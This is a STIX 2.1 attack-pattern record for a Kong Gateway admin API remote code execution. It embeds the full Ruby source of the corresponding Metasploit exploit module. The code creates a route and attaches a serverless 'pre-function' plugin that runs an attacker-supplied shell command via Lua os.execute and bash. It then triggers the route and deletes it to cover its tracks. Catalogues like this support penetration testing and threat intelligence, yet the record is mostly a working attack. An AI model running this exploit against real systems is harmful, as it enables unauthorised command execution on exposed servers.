{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--50d525b4-fd9d-4e0d-9b96-c5dffd93cf50",
    "created": "2024-08-14T17:09:50.614882Z",
    "modified": "2024-08-14T17:09:50.614885Z",
    "name": "Kong Gateway Admin API Remote Code Execution",
    "description": " This module uses the Kong admin API to create a route and a serverless function plugin that is associated with the route. The plugin runs Lua code and is used to run a system command using os.execute(). After execution the route is deleted, which also deletes the plugin.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/kong_gateway_admin_api_rce.rb",
            "external_id": "kong_gateway_admin_api_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://konghq.com/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Kong/kong"
        },
        {
            "source_name": "reference",
            "url": "https://docs.konghq.com/hub/kong-inc/serverless-functions/"
        }
    ],
    "x_code_snippet": "# frozen_string_literal: true\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Kong Gateway Admin API Remote Code Execution',\n        'Description' => %q{\n          This module uses the Kong admin API to create a route and a serverless function plugin that is associated with\n          the route. The plugin runs Lua code and is used to run a system command using os.execute(). After execution the\n          route is deleted, which also deletes the plugin.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Graeme Robinson'],\n        'References' => [\n          ['URL', 'https://konghq.com/'],\n          ['URL', 'https://github.com/Kong/kong'],\n          ['URL', 'https://docs.konghq.com/hub/kong-inc/serverless-functions/']\n        ],\n        'Platform' => %w[linux macos],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Unix (In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-10-13',\n        'DefaultOptions' => { 'RPORT' => 8001 },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('PUBLIC-API-RHOST', [false, 'The host where the public API is available, if different to RHOST']),\n        OptInt.new('PUBLIC-API-RPORT', [true, 'The port where the public API is available', 8000]),\n        OptString.new('TARGETURI', [true, 'URI to the Kong server', '/'])\n      ],\n      self.class\n    )\n  end\n\n  def check_response(response, expected, path, description)\n    fail_with(Failure::Unreachable, \"No response received from #{path} when #{description}\") unless response\n    return if response.code == expected\n\n    fail_with(Failure::UnexpectedReply,\n              \"Unexpected response from #{path} when #{description} (received #{response.code}, expected #{expected})\")\n  end\n\n  def create_route\n    path = normalize_uri(target_uri.path, 'routes')\n    response = send_request_cgi({\n      'method' => 'POST', 'uri' => path,\n      'vars_post' => { 'name' => @rand_name, 'paths' => \"/#{@rand_name}\" }\n    })\n    check_response(response, 201, path, 'creating route')\n  end\n\n  def create_plugin\n    # The double square brackets helps to ensure single/double quotes in cmd payload do not interfere with syntax of\n    # os.execute Lua function. The ampersand backgrounds the command so that it doesn't cause Kong to hang.\n    cmd = %{os.execute([[bash -c \"#{payload.encoded}\" &]])}\n    path = normalize_uri(target_uri.path, 'routes', @rand_name, 'plugins')\n    response = send_request_cgi({\n      'method' => 'POST', 'uri' => path,\n      'vars_post' => { 'name' => 'pre-function', 'config.access' => cmd }\n    })\n    check_response(response, 201, path, 'creating plugin')\n  end\n\n  def request_route\n    path = normalize_uri(target_uri.path, @rand_name)\n    rhost = datastore['PUBLIC-API-RHOST'] if datastore['PUBLIC-API-RHOST']\n    rport = datastore['PUBLIC-API-RPORT'] if datastore['PUBLIC-API-RPORT']\n    retry_count = 0\n    begin\n      response = send_request_cgi({ 'uri' => path, 'rhost' => rhost, 'rport' => rport })\n      check_response(response, 503, path, 'requesting route')\n    rescue Msf::Exploit::Failed\n      maximum_retries = 3\n      if retry_count <= maximum_retries\n        retry_count += 1\n        print_status(\"Route not yet available, trying again - attempt #{retry_count}/#{maximum_retries}\")\n        sleep(retry_count**2)\n        retry\n      end\n      raise\n    end\n  end\n\n  def delete_route\n    path = normalize_uri(target_uri.path, 'routes', @rand_name)\n\n    # Delete it\n    response = send_request_cgi({ 'method' => 'DELETE', 'uri' => path })\n    check_response(response, 204, path, 'deleting route')\n\n    # Check Whether it deleted\n    response = send_request_cgi({ 'uri' => path })\n    check_response(response, 404, path, 'verifying that route has been deleted')\n  end\n\n  def check\n    @route_cleanup_required = false\n    # Check admin API\n    response = send_request_cgi\n    return CheckCode::Unknown unless response\n    return CheckCode::Safe unless response.get_json_document['tagline'] == 'Welcome to kong'\n\n    # Check public API\n    rhost = datastore['PUBLIC-API-RHOST'] if datastore['PUBLIC-API-RHOST']\n    rport = datastore['PUBLIC-API-RPORT'] if datastore['PUBLIC-API-RPORT']\n    path = normalize_uri(target_uri.path, @rand_name)\n    response = send_request_cgi({ 'rport' => rport, 'rhost' => rhost, 'uri' => path })\n    return CheckCode::Unknown unless response\n    return CheckCode::Safe unless response.get_json_document['message'] == 'no Route matched with those values'\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    @rand_name = rand_text_alphanumeric(10)\n    @route_cleanup_required = false\n    fail_with(Failure::UnexpectedReply, 'Admin API not detected') unless check == CheckCode::Appears\n    @route_cleanup_required = true\n    create_route\n    vprint_good(\"Created route #{@rand_name}\")\n    create_plugin\n    vprint_good(\"Created plugin for route #{@rand_name}\")\n    request_route\n    vprint_good(\"Requested route #{@rand_name} using public API\")\n  end\n\n  def cleanup\n    return unless @route_cleanup_required\n\n    delete_route\n    vprint_good(\"Deleted route #{@rand_name}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-13",
    "x_mitre_platforms": [
        "unix'"
    ]
}